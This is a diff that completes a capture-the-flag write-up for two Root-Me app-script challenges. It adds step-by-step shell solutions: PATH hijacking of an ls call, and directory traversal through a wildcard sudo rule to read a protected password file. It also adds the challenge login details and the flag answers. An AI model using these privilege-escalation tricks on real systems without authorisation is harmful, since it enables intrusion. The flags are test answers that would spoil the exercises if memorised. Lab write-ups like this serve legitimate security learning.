@@ -43,7 +43,7 @@ Exploit environment weaknesses, configuration mistakes and vulnerability pattern
 - Points: 5
 - Level: 1
 
-### Description
+### Statement
 
 Source Code:
 
@@ -97,7 +97,13 @@ app-script-ch11@challenge02:~$ strings .passwd
 strings: .passwd: Permission denied
 ~~~
 
-We obviously need to more clever. We can see from the c source code that the program calls the ls program without the complete path to the binary (/bin/ls).  We can simply copy the cat binary to the temporary directory:
+We obviously need to more clever. We can see from the c source code that the program calls the ls program without the complete path to the binary (/bin/ls).  We can simply copy the cat binary to a temporary directory and set the PATH variable to point to the new program:
+  
+~~~shell
+app-script-ch11@challenge02:~$ cp /bin/cat /var/tmp/ls
+app-script-ch11@challenge02:~$ PATH=/var/tmp:$PATH ./ch11
+!oPe96a/.s8d5
+~~~
   
 </details>
 
@@ -108,7 +114,7 @@ We obviously need to more clever. We can see from the c source code that the pro
 <summary markdown="span">Answer</summary>
 
 ~~~
-
+!oPe96a/.s8d5
 ~~~
 
 </details>
@@ -121,24 +127,27 @@ We obviously need to more clever. We can see from the c source code that the pro
 
 ## sudo weak configuration
 
-- Author: name
-- X Points
+- Author: notfound404
+- Date: 6 February 2012
+- Points: 5
+- Level: 1
 
-### Description
+### Statement
 
-Description Here
+Wishing to simplify the task by not modifying rights, the administrator has not thought about the side effects ...
 
-### Hints
+### Connection
 
-1. Hint 1
+- Host: challenge02.root-me.org
+- Protocol: SSH
+- Port: 2222
+- SSH access: ssh -p 2222 app-script-ch1@challenge02.root-me.org     WebSSH
+- Username: app-script-ch1
+- Password: app-script-ch1
 
-### Connection Details
+### Resources
 
-1. Detail 1
-
-### Attachments
-
-1. Attachment 1
+1. [sudo you are doing it wrong](https://repository.root-me.org/Administration/Unix/EN%20-%20sudo%20you%20are%20doing%20it%20wrong.pdf).
 
 ### Solutions
 
@@ -146,7 +155,38 @@ Description Here
 
 <summary markdown="span">Solution 1</summary>
 
-Detail here
+We can connect to the challenge server:
+  
+~~~shell
+$ ssh -p 2222 app-script-ch11@challenge02.root-me.org
+~~~
+  
+We can look at the current directory:
+  
+~~~shell
+app-script-ch1@challenge02:~$ ls
+ch1cracked  notes  readme.md
+app-script-ch1@challenge02:~$ pwd
+/challenge/app-script/ch1
+~~~
+  
+The task suggests that this challenge is related to a weak sudo policy.  Let us look at the sudo policy:
+
+~~~shell
+app-script-ch1@challenge02:~$ sudo -l
+Matching Defaults entries for app-script-ch1 on challenge02:
+    env_reset, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, !mail_always, !mail_badpass, !mail_no_host, !mail_no_perms, !mail_no_user
+
+User app-script-ch1 may run the following commands on challenge02:
+    (app-script-ch1-cracked) /bin/cat /challenge/app-script/ch1/notes/*
+~~~
+
+We can see we can run sudo as another user, app-script-ch1-cracked to execute /bin/cat in directory /challenge/app-script/ch1/notes/*.  The flag is in /challenge/app-script/ch1/ch1cracked; we can use this to read the .passwd file:
+  
+~~~shell
+app-script-ch1@challenge02:~$ sudo -u app-script-ch1-cracked /bin/cat /challenge/app-script/ch1/notes/../ch1cracked/.passwd
+b3_c4r3ful_w1th_sud0
+~~~
 
 </details>
 
@@ -157,7 +197,7 @@ Detail here
 <summary markdown="span">Answer</summary>
 
 ~~~
-
+b3_c4r3ful_w1th_sud0
 ~~~
 
 </details>
